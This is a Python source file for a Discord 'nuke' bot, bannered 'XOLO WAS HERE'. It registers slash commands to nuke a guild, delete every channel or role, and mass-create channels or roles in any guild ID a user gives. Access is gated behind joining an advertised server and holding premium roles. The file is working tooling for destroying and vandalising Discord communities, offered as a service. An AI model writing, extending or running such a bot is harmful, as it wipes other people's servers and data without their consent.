
# ██╗░░██╗░█████╗░██╗░░░░░░█████╗░  ░██╗░░░░░░░██╗░█████╗░░██████╗  ██╗░░██╗███████╗██████╗░███████╗
# ╚██╗██╔╝██╔══██╗██║░░░░░██╔══██╗  ░██║░░██╗░░██║██╔══██╗██╔════╝  ██║░░██║██╔════╝██╔══██╗██╔════╝
# ░╚███╔╝░██║░░██║██║░░░░░██║░░██║  ░╚██╗████╗██╔╝███████║╚█████╗░  ███████║█████╗░░██████╔╝█████╗░░
# ░██╔██╗░██║░░██║██║░░░░░██║░░██║  ░░████╔═████║░██╔══██║░╚═══██╗  ██╔══██║██╔══╝░░██╔══██╗██╔══╝░░
# ██╔╝╚██╗╚█████╔╝███████╗╚█████╔╝  ░░╚██╔╝░╚██╔╝░██║░░██║██████╔╝  ██║░░██║███████╗██║░░██║███████╗
# ╚═╝░░╚═╝░╚════╝░╚══════╝░╚════╝░  ░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═════╝░  ╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝



import asyncio
import json
import websockets
import aiohttp

from . import commands


class DiscordGateway(commands.Modules):
    already_left = True

    def __init__(self, Main):
        self.Main = Main
        super().__init__()
        self.token = Main.bot_info["nuke"]["token"]
        self.gateway_url = 'wss://gateway.discord.gg/?v=10&encoding=json'
        self.session_id = None
        self.heartbeat_interval = None
        self.sequence = None

    @commands.Modules.guild_join_event
    async def register_commands(self, guild_id, data):
        url = f"https://discord.com/api/v10/applications/{self.Main.bot_info['nuke']['client_id']}/guilds/{guild_id}/commands"
        
        headers = {
            "Authorization": f"Bot {self.token}",
            "Content-Type": "application/json"
        }
        commands = [
            {
                "name": "nuke",
                "description": "Nuke a guild",
                "type": 1,
                "options": [
                    {
                        "name": "guild_id",
                        "description": "guild id to nuke",
                        "type": 3,
                        "required": True
                    }
                ]
            },
            {
                "name": "delete_channels",
                "description": "Delete every channel from a guild",
                "type": 1,
                "options": [
                    {
                        "name": "guild_id",
                        "description": "guild id to delete channels from",
                        "type": 3,
                        "required": True
                    }
                ]
            },
            {
                "name": "delete_roles",
                "description": "Delete every role from a guild",
                "type": 1,
                "options": [
                    {
                        "name": "guild_id",
                        "description": "guild id to delete roles from",
                        "type": 3,
                        "required": True
                    }
                ]
            },
            {
                "name": "create_channels",
                "description": "Create channels in a guild",
                "type": 1,
                "options": [
                    {
                        "name": "guild_id",
                        "description": "guild id to create channels on",
                        "type": 3,
                        "required": True
                    }
                ]
            },
            {
                "name": "create_roles",
                "description": "Create roles in a guild",
                "type": 1,
                "options": [
                    {
                        "name": "guild_id",
                        "description": "guild id to create roles on",
                        "type": 3,
                        "required": True
                    }
                ]
            }
        ]
        async with aiohttp.ClientSession() as session:
            for json_data in commands:
                async with session.post(url, headers=headers, json=json_data) as response:
                    if response.status not in [200, 201]:
                        print(f"Failed to register command for {'global' if not guild_id else f'guild {guild_id}'}: {response.status}")
                    else:
                        print(f"Command registered successfully for {'global' if not guild_id else f'guild {guild_id}'}")

    async def connect(self):
        while True:
            try:
                async with websockets.connect(self.gateway_url) as ws:
                    await self.identify(ws)
                    await self.listen(ws)
            except websockets.ConnectionClosed:
                print("Connection closed, reconnecting...")
                continue

    async def identify(self, ws):
        payload = {
            "op": 2,
            "d": {
                "token": self.token,
                "intents": 32767,
                "properties": {
                    "$os": "windows",
                    "$browser": "my_library",
                    "$device": "my_library"
                }
            }
        }
        await ws.send(json.dumps(payload))

    async def listen(self, ws):
        while True:
            try:
                message = await ws.recv()
                await self.handle_message(ws, message)
            except websockets.ConnectionClosed:
                print("Connection lost during message reception, attempting to reconnect...")
                break

    async def handle_message(self, ws, message):
        data = json.loads(message)
        if data['op'] == 10:
            self.heartbeat_interval = data['d']['heartbeat_interval'] / 1000
            asyncio.create_task(self.heartbeat(ws))
        
        if data['op'] == 11:
            print("Heartbeat acknowledged")
        
        if data['t'] == 'INTERACTION_CREATE':
            interaction = data['d']
            command_name = interaction['data']['name']
            user_id = int(interaction["member"]['user']['id']) if interaction.get("member") else int(interaction['user']['id'])
            asyncio.create_task(self.handle_interaction(command_name, interaction, user_id))
                
        if data['t'] == 'GUILD_CREATE':
            guild_id = data['d']['id']
            asyncio.create_task(self.register_commands(guild_id, data))
            
        if data.get('s'):
            self.sequence = data['s']

    async def heartbeat(self, ws):
        while True:
            await asyncio.sleep(self.heartbeat_interval)
            payload = {
                "op": 1,
                "d": self.sequence
            }
            await ws.send(json.dumps(payload))

    async def handle_interaction(self, command_name, interaction, user_id):
        async with aiohttp.ClientSession() as session:
            valid, message = await self.validate_interaction(session, command_name, user_id)
            response_payload = {
                "content": message,
                "tts": False,
                "flags": 64
            }
            async with session.post(f'https://discord.com/api/v10/interactions/{interaction["id"]}/{interaction["token"]}/callback', headers= {"Authorization": f"Bot {self.token}", "Content-Type": "application/json"}, json={"type": 4, "data": response_payload}) as resp:
                if resp.status == 204 and valid:
                    asyncio.create_task(getattr(self, f'handle_{command_name}')(interaction, user_id))
                else:
                    print(f"Failed to send response: {resp.status}")

    async def validate_interaction(self, session, command_name, user_id):
        user_roles = await self.get_user_roles_in_guild(session, self.Main.guild_id, user_id)
        if not user_roles:
            return False, "You are not allowed to use this bot. Join the server to access the bot. https://discord.gg/gERJHN2R"
        
        if command_name in self.Main.premium["commands"]:
            for role_id in user_roles:
                if role_id in self.Main.premium and command_name in self.Main.premium[role_id]:
                    return True, f"Handling {command_name.replace('_', ' ').title()}..."
            return False, "You are not allowed to use this bot. You are missing a role. Join the server to access the role. https://discord.gg/gERJHN2R"
        
        return True, f"Handling {command_name.replace('_', ' ').title()}..."
    
    async def handle_nuke(self, interaction, user_id):
        await self.nuke(interaction['data'].get('options', [])[0]['value'], user_id)

    async def handle_delete_channels(self, interaction, user_id):
        await self.delete_channels(interaction['data'].get('options', [])[0]['value'])

    async def handle_delete_roles(self, interaction, user_id):
        await self._delete_guild_roles(interaction['data'].get('options', [])[0]['value'])

    async def handle_create_channels(self, interaction, user_id):
        await self._create_guild_channels(interaction['data'].get('options', [])[0]['value'])
    
    async def handle_create_roles(self, interaction, user_id):
        await self._create_guild_roles(interaction['data'].get('options', [])[0]['value'])
